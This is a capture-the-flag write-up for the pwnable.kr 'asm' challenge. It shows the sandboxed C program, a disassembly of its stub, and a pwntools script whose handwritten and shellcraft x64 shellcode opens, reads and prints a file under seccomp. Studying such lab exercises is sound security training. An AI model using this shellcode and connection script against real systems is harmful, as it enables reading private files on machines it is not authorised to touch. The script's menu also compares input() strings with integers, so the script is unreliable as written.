# asm

This is my writeup for the asm level on pwnable.kr this is about writing a simple shellcode, to exploit a program.
### Disclaimer!

I changed the original flag with the custom flag "Shad3 pwnned this", it's better to exploit it yourself,
than just copy it :P.

## Enumeration

By connecting through SSH, as asm, we get 4 files, one seems to have a pretty strange name. Let's start analysing them.


```python
shad3@zeroday:~$ ssh asm@pwnable.kr -p2222
asm@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@gatech.edu
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
Last login: Thu Apr 23 04:51:21 2020 from 58.221.239.93
asm@pwnable:~$ ls
asm
asm.c
readme
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```

By running the executable we do get an idea of what we must do to get the flag.

```
asm@pwnable:~$ ./asm 
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: 
```

Since I dont trust what the executable says lets have a look at the source code to understand if that's true or not.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}

```
As it seems it was true that we are in jail. So lets disassemble the stub to understand what it does keep in mind that it asks for a x64 shellcode we are on x86_64 machine so will decompile it as so.

```
shad3@zeroday:~$ rasm2 -b64 -d -B `printf "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"`
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rsi, rsi
xor rdi, rdi
xor rbp, rbp
xor r8, r8
xor r9, r9
xor r10, r10
xor r11, r11
xor r12, r12
xor r13, r13
xor r14, r14
xor r15, r15
shad3@zeroday

```
## Exploitation
From the disassembly its easy to understand that it just zeros-out some some registers. So lets write the shellcode that opens the flag file and prints out the string that it contains.

We have 2 choices either to code the following shellcode or use the shellcraft function from the pwnlib. I implemented both in the following script, by running that you get the flag

```python
from pwn import *

context.update(arch="amd64",os="linux",bit=64)

rssh = ssh(host="pwnable.kr",port=2222,user="asm",password="guest")
p = rssh.connect_remote("localhost",9026)

def pwn(shellcode):
    p.recvuntil("give me your x64 shellcode:")
    p.send(shellcode)
    p.interactive()
    p.close()
    

def shellcraft():
    shellcode = shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
    shellcode += shellcraft.open('rsp', 0, 0)
    shellcode += shellcraft.read('rax', 'rsp', 100)
    shellcode += shellcraft.write(1, 'rsp', 100)
    shellcode += shellcraft.exit()
    pwn(shellcode)

def hcAssembly():
    shellcode = asm("""
            xor rax,rax
            xor rdi,rdi
            xor rsi,rsi
            xor rdx,rdx
            jmp init

        open:
	        pop rdi
	        mov rax,2
	        syscall

        read:
	        mov rdi,rax
	        mov rsi,rsp
	        mov rdx,0x40
	        xor rax,rax
	        syscall

        write:
	        mov rdi,1
	        mov rdx,40
	        mov rax,1
	        syscall

        exit:
	        mov rax,0x3c
	        syscall

        init:
	        call open
	        .ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
	        .byte 0                 
    """)
    pwn(shellcode)


     
while(1):
    print("There are two ways to exploit this either by hardcoded assembly (1) \n or by using pwnlib's shellcrafting")  
    selection = input()
    if (selection == 1):
        hcAssembly()
        exit(0)
    elif (selection == 2):
        shellcraft()
        
```


```python
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/asm$python exploit.py
Shad3 pwnned this!
```